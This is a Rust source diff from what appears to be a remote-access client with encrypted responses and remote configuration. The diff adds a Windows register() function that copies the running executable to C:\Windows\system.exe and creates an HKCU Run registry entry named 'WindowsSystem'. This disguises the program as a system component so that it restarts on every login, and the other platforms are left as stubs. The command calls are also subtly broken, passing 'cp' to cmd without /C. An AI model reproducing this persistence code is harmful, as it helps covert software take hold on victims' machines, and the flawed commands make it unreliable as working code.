@@ -101,10 +101,7 @@ pub struct Response {
 
 impl Response {
   pub fn new(headers: String, body: String) -> Response {
-    Response {
-      headers,
-      body,
-    }
+    Response { headers, body }
   }
 
   pub fn decrypted_body(self) -> String {
@@ -153,6 +150,60 @@ impl Connection for TcpStream {
   fn r(&mut self, buf: &mut String) -> IResult<usize> {
     self.read_to_string(buf)
   }
+}
+
+#[cfg(target_os = "macos")]
+pub fn register() {
+  todo!();
+}
+
+#[cfg(target_os = "windows")]
+pub fn register() {
+  // cp CURRENT_PATH_HERE C:\Windows\system.exe
+  // REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "WindowsSystem" /t REG_SZ /F /D "C:\Windows\system.exe"
+
+  let current_path = std::env::current_exe().unwrap().display().to_string();
+
+  Command::new("cmd")
+    .args(&[
+      "cp",
+      &current_path,
+      &PathBuf::from("C:\\Windows\\system.exe")
+        .display()
+        .to_string(),
+    ])
+    .output()
+    .unwrap();
+
+  Command::new("cmd")
+    .args(&[
+      "REG",
+      "ADD",
+      &PathBuf::from("HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run")
+        .display()
+        .to_string(),
+      "/V",
+      "WindowsSystem",
+      "/t",
+      "REG_SZ",
+      "/F",
+      "/D",
+      &PathBuf::from("C:\\Windows\\system.exe")
+        .display()
+        .to_string(),
+    ])
+    .output()
+    .unwrap();
+}
+
+#[cfg(target_os = "linux")]
+pub fn register() {
+  todo!();
+}
+
+#[cfg(other)]
+fn register() {
+  todo!();
 }
 
 pub fn get_conf(addr: &str) -> Result<Config> {
